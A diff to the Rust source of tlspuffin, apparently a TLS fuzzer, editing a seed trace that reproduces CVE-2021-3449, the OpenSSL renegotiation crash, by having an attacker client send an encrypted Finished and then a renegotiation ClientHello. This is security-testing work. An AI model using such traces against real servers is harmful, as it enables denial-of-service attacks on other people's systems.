@@ -599,7 +599,6 @@ fn _seed_client_attacker12(client: AgentName, server: AgentName) -> (Trace, Term
                 agent: server,
                 action: Action::Input(InputAction {
                     recipe: app!(
-                        
                         fn_encrypt12,
                         app!(fn_finished12, client_verify_data.clone()),
                         var!(Random, (0, 0)),
@@ -608,21 +607,13 @@ fn _seed_client_attacker12(client: AgentName, server: AgentName) -> (Trace, Term
                     ),
                 }),
             },
-            Step {
-                agent: server,
-                action: Action::Output(OutputAction { id: 1 }),
-            },
         ],
     };
 
     (trace, client_verify_data)
 }
 
-// todo https://gitlab.inria.fr/mammann/tlspuffin/-/issues/40
-// todo it seems this needs to be encrypted? somehow the server is not processing this data
 pub fn seed_cve_2021_3449(client: AgentName, server: AgentName) -> Trace {
-    let mut s = &SIGNATURE;
-
     let (mut trace, client_verify_data) = _seed_client_attacker12(client, server);
 
     let renegotiation_client_hello = app!(
@@ -657,20 +648,6 @@ pub fn seed_cve_2021_3449(client: AgentName, server: AgentName) -> Trace {
         )
     );
 
-    /*    trace.stepSignature::push(Step {
-            agent: server,
-            action: Action::Input(InputAction {
-                recipe: app!(
-                    
-                    op_encrypt12,
-                    app_const!(op_alert_close_notify),
-                    var!(Random, (0, 0)),
-                    app!(op_decode_ecdh_paramvar!(Vec<u8>, (0, 2))), // ServerECDHParams
-                    app_const!(op_seq_1)
-                ),
-            }),
-        });
-    */
     trace.steps.push(Step {
         agent: server,
         action: Action::Input(InputAction {
@@ -684,10 +661,21 @@ pub fn seed_cve_2021_3449(client: AgentName, server: AgentName) -> Trace {
         }),
     });
 
-    trace.steps.push(Step {
+    /*
+    trace.stepSignature::push(Step {
         agent: server,
-        action: Action::Output(OutputAction { id: 10 }),
+        action: Action::Input(InputAction {
+            recipe: app!(
+
+                op_encrypt12,
+                app_const!(op_alert_close_notify),
+                var!(Random, (0, 0)),
+                app!(op_decode_ecdh_paramvar!(Vec<u8>, (0, 2))), // ServerECDHParams
+                app_const!(op_seq_1)
+            ),
+        }),
     });
+    */
 
     trace
 }
